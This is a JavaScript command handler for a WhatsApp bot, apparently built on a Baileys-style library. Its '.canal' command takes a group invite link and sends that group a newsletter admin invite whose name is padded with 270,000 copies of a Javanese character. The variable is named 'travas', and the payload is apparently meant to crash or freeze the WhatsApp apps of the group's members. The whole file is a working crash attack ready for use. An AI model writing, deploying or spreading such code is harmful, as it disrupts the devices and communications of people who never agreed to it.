let handler = async (m, { conn, text }) => {
  const ownerNumber = '527447800928@s.whatsapp.net'; // Reemplaza con el número real del owner
  const botNumber = conn.user?.jid || '';
  const sender = m.sender;

  if (sender !== ownerNumber && sender !== botNumber) {
    return conn.reply(m.chat, '👑 Este comando solo está disponible para el owner y el número del bot.', m);
  }

  if (!text || !text.includes('whatsapp.com')) {
    return m.reply('😿 Debes proporcionar el enlace del grupo.\nEjemplo: .canal https://chat.whatsapp.com/XXXX', m);
  }

  const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
  if (!match) return m.reply('😡 Enlace inválido.', m);

  const inviteCode = match[1];

  let groupId;
  try {
    const res = await conn.groupGetInviteInfo(inviteCode);
    groupId = res.id; 
  } catch (e) {
    return m.reply("⚠️ No se pudo obtener el ID del grupo. Verifica que el enlace sea válido o que el grupo exista.");
  }

  const travas = 'ꦾ'.repeat(90000);

  await conn.relayMessage(groupId, {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363282786345717@newsletter",
      newsletterName: "😼😼😼😼" + travas + travas + travas,
      jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
      caption: "JojixTobi☠️",
      inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
    }
  }, {});

  await conn.sendMessage(m.chat, { text: `🦊 Enviado correctamente al grupo.` }, { quoted: m });
};

handler.command = ['canal'];
handler.tags = ['fake', 'grupo'];
handler.help = ['canal <enlace>'];

export default handler;
